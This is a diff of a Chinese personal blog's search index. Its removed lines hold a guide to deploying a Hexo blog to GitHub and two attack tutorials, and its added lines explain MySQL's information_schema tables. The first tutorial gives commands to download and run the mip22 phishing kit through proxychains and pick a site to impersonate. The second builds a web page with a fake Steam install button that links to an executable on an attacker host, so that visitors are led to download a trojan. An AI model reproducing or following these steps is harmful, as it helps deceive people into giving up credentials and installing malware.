-<p> 然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：<br>9.key填写C:\Users\Administrator.ssh\id_rsa.pub中的内容<br>10.尝试ssh连接,测试是否成功,如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，就算成功。</p>
-<p>ssh -T <span class="exturl"><a class="exturl__link"   href="mailto:git@github.com" >git@github.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> </p>
-<p>11.在选中的位置(blog目录下)打开cmd</p>
-<p>npm install hexo-deployer-git –save<br>git config –global user.name “github用户名，非昵称 “<br>git config –global user.email “github注册邮箱“</p>
-<p>12.准备上传代码</p>
+<p>7.information _schema库</p>
+<p><code>information_schema</code> 是 MySQL 数据库系统（SQL5开始）中的一个系统数据库，它包含了有关数据库服务器的元数据（metadata元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）和其他信息。这个数据库中的表和视图提供了对数据库服务器状态和配置的访问。</p>
+<p>（1）<strong>SCHEMATA：</strong></p>
 <ul>
-<li>在github上新建一个存储库，命名为github的用户名.github.io</li>
-<li>编辑_config.yml文件，在最后改成这样（注意保持格式，缩进不对，会导致一会儿，上传不成功）</li>
+<li>包含所有数据库的信息，比如数据库名称、字符集、排序规则等。</li>
 </ul>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">deploy: </span><br><span class="line">   type: git </span><br><span class="line">   repository: git@github.com:luozhixiaowo/luozhixiaowo.github.io.gi </span><br><span class="line">   t </span><br><span class="line">   branch: main</span><br></pre></td></tr></table></div></figure>
-
-<p>13.上传</p>
-<p>hexo d</p>
-]]></content>
-      <tags>
-        <tag>个人博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>钓鱼网站链接获取</title>
-    <url>/2023/12/01/text1/</url>
-    <content><![CDATA[<p>1.vim &#x2F;etc&#x2F;proxychains4.conf (修改socks 4-5 更改IP和端口号)<br>2.proxychains4 git clone <span class="exturl"><a class="exturl__link"   href="https://github.com/makdosx/mip22" >https://github.com/makdosx/mip22</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> (下载需要的文件)<br>3.cd mip22<br>4.chmod +x  .&#x2F;* (增加执行权限)<br>5.proxychains4 bash .&#x2F;mip22.sh (执行脚本文件)<br>出现底下情况执行  proxychains4  -q bash .&#x2F;mip22.sh<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172697552-5a930f93-1f4d-42d9-9a65-ea7dfc19fe72.png" alt="image.png"><br>6.输入1<img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172800528-0d644e07-094e-4222-84ca-27f41ca044b3.png" alt="image.png"><br>7.输入数字选择需要的网站<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172935240-816c59e7-9091-4b9b-b985-f25dabc75c51.png" alt="image.png"></p>
-<p>8.根据数字选择链接在内网还是外网生效<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701172996565-8385b5a6-a5e8-479e-868a-9b14a01be7cf.png" alt="image.png"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>引导下载木马</title>
-    <url>/2023/12/01/text/</url>
-    <content><![CDATA[<p>1.安装phpstudy并启动apache服务<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255876063-304fac1e-b8d2-4a4b-bdf0-a065e0e3c413.png" alt="image.png"><br>2.打开网站根目录<br><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701255958294-f8f5bdce-de2b-4ffe-ac08-8a4cfc2a19d4.png" alt="image.png"><br>3.根据index.html的内容实现不同的引导下载方式</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;h1&gt;hello world&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></div></figure>
-
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/1701257269692-4e244c1d-df9d-4454-86c6-5ca123c37926.png" alt="image.png"><br>4.更换href里面的链接可以替换下载内容</p>
-<p><img src="https://raw.githubusercontent.com/t08769652/photo/main/img/image-20231203111412598.png" alt="image-20231203111412598"></p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="code"><pre><span class="line">&lt;a class=&quot;header_installsteam_btn_content&quot; href=&quot;http://192.168.101.130/SteamSetup.exe&quot;&gt;</span><br></pre></td></tr></table></div></figure>
-
+<p>（2）<strong>TABLES：</strong></p>
+<ul>
+<li>包含所有表的信息，比如表名、所属数据库、表类型、存储引擎等。</li>
+</ul>
+<p>（3）<strong>COLUMNS：</strong></p>
+<ul>
+<li>包含所有表的列信息，如列名、数据类型、是否为主键等。</li>
+</ul>
+<p>（4）<strong>STATISTICS：</strong></p>
+<ul>
+<li>包含表索引的统计信息，如索引名、唯一键信息等。</li>
+</ul>
+<p>（5）<strong>KEY_COLUMN_USAGE：</strong></p>
+<ul>
+<li>包含使用主键或唯一键的外键信息。</li>
+</ul>
+<p>（6）<strong>ROUTINES：</strong></p>
+<ul>
+<li>包含存储过程和函数的信息。</li>
+</ul>
+<p>（7）<strong>VIEWS：</strong></p>
+<ul>
+<li>包含数据库中所有视图的信息。</li>
+</ul>
+<p>（8）<strong>USER_PRIVILEGES、SCHEMA_PRIVILEGES、TABLE_PRIVILEGES：</strong></p>
+<ul>
+<li>包含用户和角色的权限信息。</li>
+</ul>
 ]]></content>
   </entry>
 </search>
